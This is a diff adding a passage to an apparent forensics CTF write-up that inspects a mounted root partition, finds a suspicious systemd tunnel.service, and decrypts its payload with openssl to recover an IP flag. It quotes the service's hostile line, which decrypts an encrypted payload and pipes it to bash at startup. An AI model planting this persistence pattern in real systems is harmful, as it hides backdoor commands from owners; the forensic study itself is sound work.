@@ -215,3 +215,99 @@ ls /mnt/root
 <p align="center">
   <img src="./images/D12_11.png" alt="check /dev/mapper/, mount root partition, check /mnt/root" width="500"/>
 </p>
+
+### Analyzing Root Partition
+
+Multiple locations on the root partition were inspected, including:
+- `/mnt/root/tmp`
+- `/mnt/root/etc/crontab`
+- `/mnt/root/opt`
+- `/mnt/root/etc`
+- `/mnt/root/var/log`
+
+Multiple references to `tinypilot` were found. The files align to the findings from D11 about IP KVM (USB devices acting as HID for remote controlling). While this connects to D11, no IOC was discovered within these files. 
+
+`tinypilot` related findings: 
+- `mnt/root/home/tinypilot`
+- `tinypilot.db`
+- `/mnt/root/opt/tinypilot`
+- `/mnt/root/opt/tinypilot-privileged`
+
+<p align="center">
+  <img src="./images/D12_12.png" alt="/mnt/root/home/tinypilot" width="500"/>
+  <img src="./images/D12_13.png" alt="/mnt/root/opt" width="500"/>
+</p>
+
+From the given resource, focused attention to the section `live response commands` to review anomalous behavior. A few categories explored are:
+- Review Network    
+- Review Activities / Command History    
+- Installed Programs
+- Large Files
+- Most recent modified files
+- devices in /dev
+- Services and systemd
+
+A custom service file located at `/mnt/root/etc/systemd/system/tunnel.service` may be related to IPs and was selected for further analysis:
+- `tunnel.service`
+
+<p align="center">
+  <img src="./images/D12_14.png" alt="/mnt/root/etc/systemd/system/" width="700"/>
+</p>
+
+Inspect `tunnel.service` by running the command below. The file contained a Base64-encoded string that was used for a command. This could contain the IOC: 
+```Bash
+sudo cat /mnt/root/etc/systemd/system/tunnel.service
+```
+
+Find an interesting line:
+> Environment=SERVICEDATA="U2FsdGVkX1/YfJQW/JLTLYE//2c7AodbgJVFXknjQ+kyUkNRZDCTXWADnwFCjHKVJAOG2rk+iUvCETeXv3+I8PWGSVOUesrzqMFp+OBVd/4=" \
+ExecStart=/bin/bash -c 'openssl enc -aes-256-cbc -d -a -pass pass:$HOSTNAME$MACHTYPE -pbkdf2 <<< "$SERVICEDATA" | bash'
+
+<p align="center">
+  <img src="./images/D12_15.png" alt="tunnel.service" width="700"/>
+</p>
+
+To decrypt the cipher test, the `HOSTNAME` and the `MATCHTYPE` is needed. From previous investigation on the network, the hostname can be found with the command:
+```Bash
+sudo cat /mnt/root/etc/hostname
+```
+
+<p align="center">
+  <img src="./images/D12_16.png" alt="/mnt/root/etc/hostname" width="350"/>
+</p>
+
+Used grep command to find where `MATCHTYPE` is mentioned:
+```Bash
+grep -Ri 'MACHTYPE' /mnt/root/*
+```
+
+Within the results is the `MATCHTYPE` value is found:
+> MACHTYPE="arm-unknown-linux-gnueabihf"
+
+<p align="center">
+  <img src="./images/D12_17.png" alt="grep for MACHTYPE" width="450"/>
+</p>
+
+The encrypted string was decrypted using OpenSSL with the combined passphrase tinypilotarm-unknown-linux-gnueabihf:
+
+Used the same openSSL command to decrypt the ciphertext with the credentials found:
+```Bash
+echo 'U2FsdGVkX1/YfJQW/JLTLYE//2c7AodbgJVFXknjQ+kyUkNRZDCTXWADnwFCjHKVJAOG2rk+iUvCETeXv3+I8PWGSVOUesrzqMFp+OBVd/4=' | \
+openssl enc -aes-256-cbc -d -a -pbkdf2 -pass pass:tinypilotarm-unknown-linux-gnueabihf
+```
+- `echo`: outputs the encrypted Base64 string.
+- `openssl enc`: runs OpenSSL’s encryption/decryption tool
+- `-aes-256-cbc`: specifies the encryption algorithm used: AES with 256-bit key in CBC mode
+- `-d`: decryption
+- `-a`: indicates the input is Base64-encoded
+- `-pbkdf2`: uses the more secure PBKDF2 key derivation method to convert the password to a key
+- `-pass pass:tinypilotarm-unknown-linux-gnueabihf`: supplies the decryption password directly
+
+The output revealed the IOC: `232.122.57.92`
+
+<p align="center">
+  <img src="./images/D12_18.png" alt="decrypt ciphertext" width="700"/>
+</p>
+
+---
+**Flag**: `232.122.57.92`
